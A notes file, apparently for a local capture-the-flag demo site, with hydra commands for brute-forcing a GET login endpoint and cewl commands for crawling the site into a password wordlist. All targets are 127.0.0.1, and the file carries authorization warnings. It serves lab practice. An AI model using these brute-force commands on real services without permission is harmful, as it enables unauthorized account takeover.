ATTACK NOTES

This document contains example commands for offline/CTF-style testing against the demo site in this repository. These examples are intended for use on systems you own or are authorized to test (such as this local CTF). Do NOT use them against systems without explicit permission.

hydra — brute-force the login form (GET)

The demo accepts GET-based login requests at /api/login?username=...&password=... and returns HTTP 200 on success, 401/403 on failure. You can use hydra to brute-force credentials like this:

Example (single username, password list):

  hydra -l admin -P /path/to/passwords.txt 127.0.0.1 http-get "/api/login?username=^USER^&password=^PASS^" -s 8000 -f -V

Example (user list + password list):

  hydra -L /path/to/usernames.txt -P /path/to/passwords.txt 127.0.0.1 http-get "/api/login?username=^USER^&password=^PASS^" -s 8000 -t 16 -f -V

Notes on flags:
- 127.0.0.1 is the target host. Use the host/IP of the site under test.
- -s 8000 specifies the port (if the static server runs on 8000).
- -f stops at the first valid pair found.
- -V is verbose output. Remove for quieter runs.
- -t controls parallel threads; tune for your environment.

If the site returns 200 for many requests (or uses custom success responses), you may need to instruct hydra what indicates failure/success. For more complex forms consider using hydra's http-form-post module and provide a failure string.

cEWl — crawl site and build a wordlist

cEWl is useful to create custom wordlists by crawling the target site. Basic usage:

Example (crawl site once, min word length 5, depth 2):

  cewl -d 2 -m 5 -w cewl_words.txt http://127.0.0.1:8000/

Flags explained:
- -d DEPTH : how deep to follow links (2 is reasonable for a small site).
- -m MINLEN : minimum word length to include (default 3).
- -w FILE : output wordlist file.
- You can add -e to include email addresses discovered on the site.

Recommended workflow for CTF/local testing
1. Run a local static server from the repo root, e.g.:

   python3 -m http.server 8000

2. Generate a focused wordlist with cewl:

   cewl -d 2 -m 5 -w cewl_words.txt http://127.0.0.1:8000/

3. Use hydra with the generated wordlist (or a curated password list):

   hydra -l admin -P cewl_words.txt 127.0.0.1 http-get "/api/login?username=^USER^&password=^PASS^" -s 8000 -f -V

Legal and ethical note
These commands can be used to attack systems. Only run them against systems you control or where you have explicit permission to test. Misuse is illegal and unethical.
